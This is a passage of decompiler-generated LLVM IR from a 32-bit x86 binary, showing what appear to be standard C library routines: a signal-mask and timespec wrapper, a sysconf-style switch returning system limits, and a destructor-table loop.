  %v2_8054863 = inttoptr i32 %v1_8054863 to i32*
  store i32 %v0_8054863, i32* %v2_8054863, align 4
  %v0_80548f8.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80548ee

dec_label_pc_805486a:                             ; preds = %dec_label_pc_805482c
  %v3_805486a = load i32, i32* %stack_var_-420, align 4
  %v12_805486a = icmp eq i32 %v3_805486a, 1
  %v2_8054876 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8054876, i32* @ebx, align 4
  %v1_805487d = icmp eq i1 %v12_805486a, false
  br i1 %v1_805487d, label %dec_label_pc_80548a4, label %dec_label_pc_805487f

dec_label_pc_805487f:                             ; preds = %dec_label_pc_805486a
  %v0_805487f = load i32, i32* @edi, align 4
  store i32 %v2_8054876, i32* %stack_var_-460, align 4
  %v4_8054883 = bitcast i32* %stack_var_-24 to %timespec*
  %v5_8054883 = call i32 @function_8055217(%timespec* %v4_8054883, i32 %v2_8054876, i32 %v0_805487f, i32 %v0_805487f)
  store i32 %v5_8054883, i32* %eax.global-to-local, align 4
  store i32 %v5_8054883, i32* @edi, align 4
  %v1_805488a = call i32 @function_80530f9(i32 %v2_8054876)
  store i32 %v1_805488a, i32* %eax.global-to-local, align 4
  store i32 %v1_805488a, i32* @ebx, align 4
  %v1_8054894 = inttoptr i32 %v1_805488a to i32*
  %v2_8054894 = load i32, i32* %v1_8054894, align 4
  store i32 %v2_8054894, i32* @esi, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_805489b = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_805489b = call i32 @function_8052e2d(i32 2, %_TYPEDEF_sigset_t* %v3_805489b, i32 0)
  store i32 %v4_805489b, i32* %eax.global-to-local, align 4
  %v0_80548a0 = load i32, i32* @esi, align 4
  %v1_80548a0 = load i32, i32* @ebx, align 4
  %v2_80548a0 = inttoptr i32 %v1_80548a0 to i32*
  store i32 %v0_80548a0, i32* %v2_80548a0, align 4
  %v0_80548ca.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80548c7

dec_label_pc_80548a4:                             ; preds = %dec_label_pc_805486a
  store i32 2, i32* %stack_var_-460, align 4
  %v3_80548aa = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_80548aa = call i32 @function_8052e2d(i32 2, %_TYPEDEF_sigset_t* %v3_80548aa, i32 0)
  store i32 %v4_80548aa, i32* %eax.global-to-local, align 4
  store i32 2, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80548c0

dec_label_pc_80548b5:                             ; preds = %dec_label_pc_80547e7
  %v2_80548b7 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_80548b7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80548c0

dec_label_pc_80548c0:                             ; preds = %dec_label_pc_80548a4, %dec_label_pc_80548b5
  %storemerge3.pre-phi = phi i32 [ %v2_8054876, %dec_label_pc_80548a4 ], [ %v2_80548b7, %dec_label_pc_80548b5 ]
  %v3_80548c0 = phi i32 [ %v2_80547cc, %dec_label_pc_80548a4 ], [ %v4_80547ec, %dec_label_pc_80548b5 ]
  %v2_80548c0 = phi i32 [ 0, %dec_label_pc_80548a4 ], [ %v4_80547ec, %dec_label_pc_80548b5 ]
  store i32 %storemerge3.pre-phi, i32* %stack_var_-460, align 4
  %v4_80548c0 = bitcast i32* %stack_var_-24 to %timespec*
  %v5_80548c0 = call i32 @function_8055217(%timespec* %v4_80548c0, i32 %storemerge3.pre-phi, i32 %v2_80548c0, i32 %v3_80548c0)
  store i32 %v5_80548c0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80548c7

dec_label_pc_80548c7:                             ; preds = %dec_label_pc_805487f, %dec_label_pc_80548c0
  %v0_80548ca = phi i32 [ %v0_80548ca.pre, %dec_label_pc_805487f ], [ %v5_80548c0, %dec_label_pc_80548c0 ]
  %v1_80548ca = icmp eq i32 %v0_80548ca, 0
  br i1 %v1_80548ca, label %dec_label_pc_80548e7, label %dec_label_pc_80548ce

dec_label_pc_80548ce:                             ; preds = %dec_label_pc_80548c7
  %v4_80548de = load i32, i32* %stack_var_-24, align 4
  store i32 %v4_80548de, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80548ee

dec_label_pc_80548e7:                             ; preds = %dec_label_pc_8054770, %dec_label_pc_80548c7
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80548ee

dec_label_pc_80548eb:                             ; preds = %dec_label_pc_8054810, %dec_label_pc_80547cb, %dec_label_pc_805479d
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80548ee

dec_label_pc_80548ee:                             ; preds = %dec_label_pc_80548e7, %dec_label_pc_80548ce, %dec_label_pc_8054842, %dec_label_pc_80548eb
  %v0_80548f8 = phi i32 [ 0, %dec_label_pc_80548e7 ], [ %v4_80548de, %dec_label_pc_80548ce ], [ %v0_80548f8.pre, %dec_label_pc_8054842 ], [ -1, %dec_label_pc_80548eb ]
  store i32 %v0_8054773, i32* @ebx, align 4
  store i32 %v0_8054772, i32* @esi, align 4
  store i32 %v0_8054771, i32* @edi, align 4
  store i32 %v0_8054770, i32* @ebp, align 4
  ret i32 %v0_80548f8

; uselistorder directives
  uselistorder i32 %storemerge3.pre-phi, { 1, 0 }
  uselistorder i32 %v1_805488a, { 1, 0, 2 }
  uselistorder i32 %v2_8054876, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_805480d, { 2, 1, 0 }
  uselistorder i32 %v4_80547ec, { 1, 0, 2, 3 }
  uselistorder i32 %v2_80547cc, { 0, 2, 4, 3, 1, 5 }
  uselistorder i32 %v2_80547b3, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v1_805479a, { 0, 3, 2, 1 }
  uselistorder i32* %stack_var_-460, { 0, 2, 3, 4, 5, 1, 6, 7, 8, 9, 10 }
  uselistorder i32* %stack_var_-24, { 2, 0, 4, 1, 5, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 5, 6, 3, 4, 2 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 25, 0, 1, 23 }
  uselistorder i32 (i32, i32*, i32)* @function_8054cbf, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_805350e, { 2, 1, 0, 3, 4 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80548ee, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80548e7, { 1, 0 }
  uselistorder label %dec_label_pc_80548c7, { 1, 0 }
  uselistorder label %dec_label_pc_80548c0, { 1, 0 }
  uselistorder label %dec_label_pc_8054802.dec_label_pc_8054802_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_805478f.dec_label_pc_805478f_crit_edge, { 1, 0 }
}

define i32 @function_80548f9(i32 %arg1) local_unnamed_addr {
dec_label_pc_80548f9:
  switch i32 %arg1, label %dec_label_pc_8054918 [
    i32 0, label %dec_label_pc_8054928
    i32 1, label %dec_label_pc_8054a0d
    i32 2, label %dec_label_pc_8054932
    i32 3, label %dec_label_pc_805493c
    i32 4, label %dec_label_pc_8054946
    i32 5, label %dec_label_pc_80549dc
    i32 6, label %dec_label_pc_805494e
    i32 7, label %dec_label_pc_805490e
    i32 8, label %dec_label_pc_805490e
    i32 9, label %dec_label_pc_805490e
    i32 10, label %dec_label_pc_805490e
    i32 11, label %dec_label_pc_805490e
    i32 12, label %dec_label_pc_805490e
    i32 13, label %dec_label_pc_805490e
    i32 14, label %dec_label_pc_805490e
    i32 15, label %dec_label_pc_805490e
    i32 16, label %dec_label_pc_805490e
    i32 17, label %dec_label_pc_805490e
    i32 18, label %dec_label_pc_805490e
    i32 19, label %dec_label_pc_805490e
    i32 20, label %dec_label_pc_805490e
    i32 21, label %dec_label_pc_805490e
    i32 22, label %dec_label_pc_805490e
    i32 23, label %dec_label_pc_8054a0d
    i32 24, label %dec_label_pc_8054a0d
    i32 25, label %dec_label_pc_8054a19
    i32 26, label %dec_label_pc_80549ea
    i32 27, label %dec_label_pc_8054a0d
    i32 28, label %dec_label_pc_8054960
    i32 29, label %dec_label_pc_80549e3
    i32 30, label %dec_label_pc_8054958
    i32 31, label %dec_label_pc_80549f8
    i32 32, label %dec_label_pc_8054a0d
    i32 33, label %dec_label_pc_8054a0d
    i32 34, label %dec_label_pc_8054a0d
    i32 35, label %dec_label_pc_80549f1
    i32 36, label %dec_label_pc_8054a20
    i32 37, label %dec_label_pc_8054a27
    i32 38, label %dec_label_pc_8054a20
    i32 39, label %dec_label_pc_805496a
    i32 40, label %dec_label_pc_8054a2e
    i32 41, label %dec_label_pc_8054a0d
    i32 42, label %dec_label_pc_80549f8
    i32 43, label %dec_label_pc_8054a27
    i32 44, label %dec_label_pc_8054a35
    i32 45, label %dec_label_pc_8054a27
    i32 46, label %dec_label_pc_80549e3
    i32 47, label %dec_label_pc_80549e3
    i32 48, label %dec_label_pc_80549e3
    i32 49, label %dec_label_pc_8054a0d
    i32 50, label %dec_label_pc_8054a0d
    i32 51, label %dec_label_pc_80549e3
    i32 52, label %dec_label_pc_80549e3
    i32 53, label %dec_label_pc_8054a0d
    i32 54, label %dec_label_pc_8054a0d
    i32 55, label %dec_label_pc_8054a0d
    i32 56, label %dec_label_pc_8054a0d
    i32 57, label %dec_label_pc_8054a0d
    i32 58, label %dec_label_pc_8054a0d
    i32 59, label %dec_label_pc_8054a0d
    i32 60, label %dec_label_pc_8054a0d
    i32 61, label %dec_label_pc_8054a0d
    i32 62, label %dec_label_pc_8054a0d
    i32 63, label %dec_label_pc_8054a0d
    i32 64, label %dec_label_pc_8054a0d
    i32 65, label %dec_label_pc_8054a0d
    i32 66, label %dec_label_pc_8054a0d
    i32 67, label %dec_label_pc_805490e
    i32 68, label %dec_label_pc_805490e
    i32 69, label %dec_label_pc_80549f1
    i32 70, label %dec_label_pc_80549f1
    i32 71, label %dec_label_pc_80549f1
    i32 72, label %dec_label_pc_80549f8
    i32 73, label %dec_label_pc_80549ff
    i32 74, label %dec_label_pc_8054a06
    i32 75, label %dec_label_pc_8054974
    i32 76, label %dec_label_pc_8054a06
    i32 77, label %dec_label_pc_805490e
    i32 78, label %dec_label_pc_805490e
    i32 79, label %dec_label_pc_805490e
    i32 80, label %dec_label_pc_805490e
    i32 81, label %dec_label_pc_805490e
    i32 82, label %dec_label_pc_805490e
    i32 83, label %dec_label_pc_805490e
    i32 84, label %dec_label_pc_805490e
    i32 85, label %dec_label_pc_8054a0d
    i32 86, label %dec_label_pc_8054a0d
    i32 87, label %dec_label_pc_80549ea
    i32 88, label %dec_label_pc_805497e
    i32 89, label %dec_label_pc_8054988
    i32 90, label %dec_label_pc_80549ff
    i32 91, label %dec_label_pc_805490e
    i32 92, label %dec_label_pc_805490e
    i32 93, label %dec_label_pc_805490e
    i32 94, label %dec_label_pc_805490e
    i32 95, label %dec_label_pc_80549e3
    i32 96, label %dec_label_pc_8054a0d
    i32 97, label %dec_label_pc_8054a0d
    i32 98, label %dec_label_pc_805490e
    i32 99, label %dec_label_pc_805490e
    i32 100, label %dec_label_pc_805490e
    i32 101, label %dec_label_pc_8054992
    i32 102, label %dec_label_pc_80549d5
    i32 103, label %dec_label_pc_8054a12
    i32 104, label %dec_label_pc_80549ea
    i32 105, label %dec_label_pc_805499c
    i32 106, label %dec_label_pc_80549f8
    i32 107, label %dec_label_pc_80549f8
    i32 108, label %dec_label_pc_80549dc
    i32 109, label %dec_label_pc_8054a19
    i32 110, label %dec_label_pc_8054a35
    i32 111, label %dec_label_pc_80549d5
    i32 112, label %dec_label_pc_8054a12
    i32 113, label %dec_label_pc_8054a35
    i32 114, label %dec_label_pc_80549a6
    i32 115, label %dec_label_pc_8054a2e
    i32 116, label %dec_label_pc_8054a0d
    i32 117, label %dec_label_pc_8054a0d
    i32 118, label %dec_label_pc_80549b0
    i32 119, label %dec_label_pc_80549ba
    i32 120, label %dec_label_pc_8054a27
    i32 121, label %dec_label_pc_80549ea
    i32 122, label %dec_label_pc_80549ea
    i32 123, label %dec_label_pc_80549ea
    i32 124, label %dec_label_pc_80549ea
    i32 125, label %dec_label_pc_805490e
    i32 126, label %dec_label_pc_805490e
    i32 127, label %dec_label_pc_8054a0d
    i32 128, label %dec_label_pc_8054a0d
    i32 129, label %dec_label_pc_805490e
    i32 130, label %dec_label_pc_805490e
    i32 131, label %dec_label_pc_8054a0d
    i32 149, label %dec_label_pc_80549c1
  ]

dec_label_pc_805490e:                             ; preds = %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9
  br label %dec_label_pc_8054a3a

dec_label_pc_8054918:                             ; preds = %dec_label_pc_80548f9
  %v1_8054918 = call i32 @function_80530f9(i32 ptrtoint (i32* @0 to i32))
  %v1_805491d = inttoptr i32 %v1_8054918 to i32*
  store i32 22, i32* %v1_805491d, align 4
  br label %dec_label_pc_8054a0d

dec_label_pc_8054928:                             ; preds = %dec_label_pc_80548f9
  br label %dec_label_pc_8054a3a

dec_label_pc_8054932:                             ; preds = %dec_label_pc_80548f9
  br label %dec_label_pc_8054a3a

dec_label_pc_805493c:                             ; preds = %dec_label_pc_80548f9
  br label %dec_label_pc_8054a3a

dec_label_pc_8054946:                             ; preds = %dec_label_pc_80548f9
  %v0_8054949 = call i32 @function_8055045()
  br label %dec_label_pc_805494e

dec_label_pc_805494e:                             ; preds = %dec_label_pc_80548f9, %dec_label_pc_8054946
  br label %dec_label_pc_8054a3a

dec_label_pc_8054958:                             ; preds = %dec_label_pc_80548f9
  %v0_805495b = call i32 @function_80550dc()
  br label %dec_label_pc_8054960

dec_label_pc_8054960:                             ; preds = %dec_label_pc_80548f9, %dec_label_pc_8054958
  br label %dec_label_pc_8054a3a

dec_label_pc_805496a:                             ; preds = %dec_label_pc_80548f9
  br label %dec_label_pc_8054a3a

dec_label_pc_8054974:                             ; preds = %dec_label_pc_80548f9
  br label %dec_label_pc_8054a3a

dec_label_pc_805497e:                             ; preds = %dec_label_pc_80548f9
  br label %dec_label_pc_8054a3a

dec_label_pc_8054988:                             ; preds = %dec_label_pc_80548f9
  br label %dec_label_pc_8054a3a

dec_label_pc_8054992:                             ; preds = %dec_label_pc_80548f9
  br label %dec_label_pc_8054a3a

dec_label_pc_805499c:                             ; preds = %dec_label_pc_80548f9
  br label %dec_label_pc_8054a3a

dec_label_pc_80549a6:                             ; preds = %dec_label_pc_80548f9
  br label %dec_label_pc_8054a3a

dec_label_pc_80549b0:                             ; preds = %dec_label_pc_80548f9
  br label %dec_label_pc_8054a3a

dec_label_pc_80549ba:                             ; preds = %dec_label_pc_80548f9
  br label %dec_label_pc_8054a3a

dec_label_pc_80549c1:                             ; preds = %dec_label_pc_80548f9
  %v5_80549c7 = call i32 @function_8054e48(i32 1, %timespec* null, i32 149, i32 149)
  %v2_80549cf = icmp slt i32 %v5_80549c7, 0
  %v1_80549d1 = icmp eq i1 %v2_80549cf, false
  br i1 %v1_80549d1, label %dec_label_pc_80549e3, label %dec_label_pc_8054a0d

dec_label_pc_80549d5:                             ; preds = %dec_label_pc_80548f9, %dec_label_pc_80548f9
  br label %dec_label_pc_8054a3a

dec_label_pc_80549dc:                             ; preds = %dec_label_pc_80548f9, %dec_label_pc_80548f9
  br label %dec_label_pc_8054a3a

dec_label_pc_80549e3:                             ; preds = %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80549c1
  br label %dec_label_pc_8054a3a

dec_label_pc_80549ea:                             ; preds = %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9
  br label %dec_label_pc_8054a3a

dec_label_pc_80549f1:                             ; preds = %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9
  br label %dec_label_pc_8054a3a

dec_label_pc_80549f8:                             ; preds = %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9
  br label %dec_label_pc_8054a3a

dec_label_pc_80549ff:                             ; preds = %dec_label_pc_80548f9, %dec_label_pc_80548f9
  br label %dec_label_pc_8054a3a

dec_label_pc_8054a06:                             ; preds = %dec_label_pc_80548f9, %dec_label_pc_80548f9
  br label %dec_label_pc_8054a3a

dec_label_pc_8054a0d:                             ; preds = %dec_label_pc_80549c1, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_8054918
  br label %dec_label_pc_8054a3a

dec_label_pc_8054a12:                             ; preds = %dec_label_pc_80548f9, %dec_label_pc_80548f9
  br label %dec_label_pc_8054a3a

dec_label_pc_8054a19:                             ; preds = %dec_label_pc_80548f9, %dec_label_pc_80548f9
  br label %dec_label_pc_8054a3a

dec_label_pc_8054a20:                             ; preds = %dec_label_pc_80548f9, %dec_label_pc_80548f9
  br label %dec_label_pc_8054a3a

dec_label_pc_8054a27:                             ; preds = %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9
  br label %dec_label_pc_8054a3a

dec_label_pc_8054a2e:                             ; preds = %dec_label_pc_80548f9, %dec_label_pc_80548f9
  br label %dec_label_pc_8054a3a

dec_label_pc_8054a35:                             ; preds = %dec_label_pc_80548f9, %dec_label_pc_80548f9, %dec_label_pc_80548f9
  br label %dec_label_pc_8054a3a

dec_label_pc_8054a3a:                             ; preds = %dec_label_pc_8054a2e, %dec_label_pc_8054a27, %dec_label_pc_8054a20, %dec_label_pc_8054a19, %dec_label_pc_8054a12, %dec_label_pc_8054a06, %dec_label_pc_80549ff, %dec_label_pc_80549f8, %dec_label_pc_80549f1, %dec_label_pc_80549ea, %dec_label_pc_80549dc, %dec_label_pc_80549d5, %dec_label_pc_80549e3, %dec_label_pc_80549ba, %dec_label_pc_80549b0, %dec_label_pc_80549a6, %dec_label_pc_805499c, %dec_label_pc_8054992, %dec_label_pc_8054988, %dec_label_pc_805497e, %dec_label_pc_8054974, %dec_label_pc_805496a, %dec_label_pc_8054960, %dec_label_pc_805494e, %dec_label_pc_805493c, %dec_label_pc_8054932, %dec_label_pc_8054928, %dec_label_pc_805490e, %dec_label_pc_8054a0d, %dec_label_pc_8054a35
  %v0_8054a3d = phi i32 [ 255, %dec_label_pc_8054a2e ], [ 2048, %dec_label_pc_8054a27 ], [ 99, %dec_label_pc_8054a20 ], [ 20, %dec_label_pc_8054a19 ], [ -128, %dec_label_pc_8054a12 ], [ 1024, %dec_label_pc_8054a06 ], [ 4, %dec_label_pc_80549ff ], [ 32, %dec_label_pc_80549f8 ], [ 256, %dec_label_pc_80549f1 ], [ 2147483647, %dec_label_pc_80549ea ], [ 16, %dec_label_pc_80549dc ], [ 127, %dec_label_pc_80549d5 ], [ 200112, %dec_label_pc_80549e3 ], [ 9, %dec_label_pc_80549ba ], [ 65535, %dec_label_pc_80549b0 ], [ -32768, %dec_label_pc_80549a6 ], [ -2147483648, %dec_label_pc_805499c ], [ 8, %dec_label_pc_8054992 ], [ 500, %dec_label_pc_8054988 ], [ 4096, %dec_label_pc_805497e ], [ 16384, %dec_label_pc_8054974 ], [ 1000, %dec_label_pc_805496a ], [ 32768, %dec_label_pc_8054960 ], [ 6, %dec_label_pc_805494e ], [ 65536, %dec_label_pc_805493c ], [ 100, %dec_label_pc_8054932 ], [ 131072, %dec_label_pc_8054928 ], [ 1, %dec_label_pc_805490e ], [ -1, %dec_label_pc_8054a0d ], [ 32767, %dec_label_pc_8054a35 ]
  ret i32 %v0_8054a3d

; uselistorder directives
  uselistorder i32 65536, { 33, 34, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 14, 15, 13, 16, 18, 17, 19, 1, 20, 0, 2, 23, 21, 24, 22, 27, 25, 26, 28, 29, 30, 31, 32 }
  uselistorder i32 16384, { 0, 5, 6, 7, 8, 9, 10, 11, 20, 21, 23, 24, 14, 15, 1, 2, 12, 13, 16, 17, 18, 19, 3, 4, 22, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i32 -2147483648, { 0, 2, 1 }
  uselistorder i32 65535, { 3, 0, 1, 2, 4 }
  uselistorder i32 1024, { 2, 0, 3, 1, 4 }
  uselistorder i32 2048, { 5, 1, 6, 2, 0, 3, 4 }
  uselistorder i32 255, { 1, 3, 4, 6, 2, 7, 8, 9, 5, 0 }
  uselistorder i32 149, { 1, 0, 2 }
  uselistorder i32 131, { 4, 0, 1, 3, 2 }
  uselistorder i32 127, { 0, 2, 1 }
  uselistorder i32 124, { 4, 5, 3, 0, 1, 6, 2 }
  uselistorder i32 123, { 1, 0 }
  uselistorder i32 118, { 1, 0 }
  uselistorder i32 117, { 2, 0, 1 }
  uselistorder i32 116, { 1, 2, 0 }
  uselistorder i32 112, { 3, 0, 1, 4, 5, 2, 6, 7, 8 }
  uselistorder i32 111, { 4, 0, 2, 1, 3 }
  uselistorder i32 110, { 5, 1, 3, 2, 4, 0 }
  uselistorder i32 108, { 20, 21, 22, 17, 23, 11, 2, 15, 0, 1, 24, 12, 13, 18, 19, 25, 26, 14, 27, 3, 4, 5, 28, 29, 6, 30, 7, 8, 9, 10, 16, 31 }
  uselistorder i32 106, { 1, 0 }
  uselistorder i32 104, { 2, 3, 4, 1, 6, 5, 0 }
  uselistorder i32 99, { 2, 3, 1, 0 }
  uselistorder i32 96, { 1, 2, 3, 0, 4 }
  uselistorder i32 95, { 3, 1, 0, 2 }
  uselistorder i32 92, { 11, 12, 1, 0, 4, 2, 3, 6, 13, 14, 9, 10, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 8, 26, 27, 28, 5, 29, 30, 7, 35, 32, 33, 34, 31, 36 }
  uselistorder i32 87, { 2, 0, 1 }
  uselistorder i32 83, { 2, 0, 1 }
  uselistorder i32 80, { 1, 2, 0 }
  uselistorder i32 76, { 3, 4, 1, 5, 0, 6, 2 }
  uselistorder i32 68, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder i32 60, { 3, 0, 1, 2 }
  uselistorder i32 58, { 1, 0 }
  uselistorder i32 55, { 2, 0, 1, 3 }
  uselistorder i32 54, { 2, 0, 1 }
  uselistorder i32 46, { 1, 2, 0 }
  uselistorder i32 43, { 7, 0, 3, 1, 4, 2, 5, 8, 6 }
  uselistorder i32 42, { 1, 2, 0 }
  uselistorder i32 41, { 1, 2, 3, 0 }
  uselistorder i32 39, { 1, 2, 3, 0 }
  uselistorder i32 38, { 2, 0, 3, 4, 1 }
  uselistorder i32 37, { 2, 0, 3, 4, 1 }
  uselistorder i32 34, { 3, 4, 5, 2, 0, 1, 6, 7, 8 }
  uselistorder i32 33, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 29, { 2, 0, 1 }
  uselistorder i32 27, { 1, 0 }
  uselistorder i32 25, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 23, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 21, { 3, 1, 2, 4, 5, 6, 0 }
  uselistorder i32 17, { 8, 5, 7, 2, 3, 1, 0, 4, 6, 9, 10 }
  uselistorder i32 13, { 3, 0, 1, 2, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 9, { 3, 11, 0, 1, 7, 16, 6, 4, 8, 5, 9, 14, 13, 12, 17, 18, 19, 20, 21, 22, 23, 10, 15, 2 }
  uselistorder i32 6, { 0, 14, 4, 5, 1, 28, 6, 2, 7, 16, 15, 17, 18, 19, 20, 21, 22, 23, 11, 8, 12, 13, 24, 25, 26, 27, 9, 3, 10 }
  uselistorder i32 5, { 13, 1, 18, 19, 7, 6, 8, 5, 15, 16, 14, 4, 2, 3, 17, 0, 9, 10, 12, 11 }
  uselistorder label %dec_label_pc_8054a3a, { 29, 0, 1, 2, 3, 4, 28, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder label %dec_label_pc_8054a0d, { 0, 34, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %dec_label_pc_80549e3, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8054960, { 1, 0 }
  uselistorder label %dec_label_pc_805494e, { 1, 0 }
}

define i32 @function_8054a3e() local_unnamed_addr {
dec_label_pc_8054a3e:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054a3e = load i32, i32* @ebx, align 4
  store i32 %v0_8054a3e, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80571a4.233 to i32), i32 -134574500), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80571a4.233 to i32), i32 -134574500), i32 2), i32 0), label %dec_label_pc_8054a52, label %dec_label_pc_8054a5f

dec_label_pc_8054a52:                             ; preds = %dec_label_pc_8054a3e, %dec_label_pc_8054a52
  %v1_8054a598 = phi i32 [ %v1_8054a59, %dec_label_pc_8054a52 ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80571a4.233 to i32), i32 -134574500), i32 2), i32 -1), %dec_label_pc_8054a3e ]
  store i32 ptrtoint (i32* @global_var_8054a59.234 to i32), i32* %stack_var_-16, align 4
  %v5_8054a52 = mul i32 %v1_8054a598, 4
  %v6_8054a52 = add i32 %v5_8054a52, ptrtoint (i32* @global_var_80571a4.233 to i32)
  %v7_8054a52 = inttoptr i32 %v6_8054a52 to i32*
  %v8_8054a52 = load i32, i32* %v7_8054a52, align 4
  call void @__pseudo_call(i32 %v8_8054a52)
  %v0_8054a59.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054a59 = add i32 %v0_8054a59.pre, -1
  store i32 %v1_8054a59, i32* %ebx.global-to-local, align 4
  %v10_8054a5a = icmp eq i32 %v0_8054a59.pre, 0
  %v1_8054a5d = icmp eq i1 %v10_8054a5a, false
  br i1 %v1_8054a5d, label %dec_label_pc_8054a52, label %dec_label_pc_8054a5f

dec_label_pc_8054a5f:                             ; preds = %dec_label_pc_8054a52, %dec_label_pc_8054a3e
  %v0_8054a5f = load i32, i32* @global_var_8057308.235, align 8
  %v1_8054a64 = icmp eq i32 %v0_8054a5f, 0
  br i1 %v1_8054a64, label %dec_label_pc_8054a6a, label %dec_label_pc_8054a68

dec_label_pc_8054a68:                             ; preds = %dec_label_pc_8054a5f
  %v0_8054a68 = load i32, i32* %stack_var_-16, align 4
  %v1_8054a68 = call i32 @unknown_0(i32 %v0_8054a68)
  br label %dec_label_pc_8054a6a

dec_label_pc_8054a6a:                             ; preds = %dec_label_pc_8054a68, %dec_label_pc_8054a5f
  %v0_8054a6a = load i32, i32* @global_var_805730c.236, align 4
  store i32 %v0_8054a6a, i32* @ecx, align 4
  %v1_8054a70 = icmp eq i32 %v0_8054a6a, 0
  br i1 %v1_8054a70, label %dec_label_pc_8054a79, label %dec_label_pc_8054a74

dec_label_pc_8054a74:                             ; preds = %dec_label_pc_8054a6a
  %v2_8054a74 = load i32, i32* %stack_var_-16, align 4
  %v1_8054a77 = call i32 @unknown_0(i32 %v2_8054a74)
  br label %dec_label_pc_8054a79

dec_label_pc_8054a79:                             ; preds = %dec_label_pc_8054a74, %dec_label_pc_8054a6a
  %v2_8054a79 = load i32, i32* %stack_var_-4, align 4
  ret i32 %v2_8054a79

; uselistorder directives
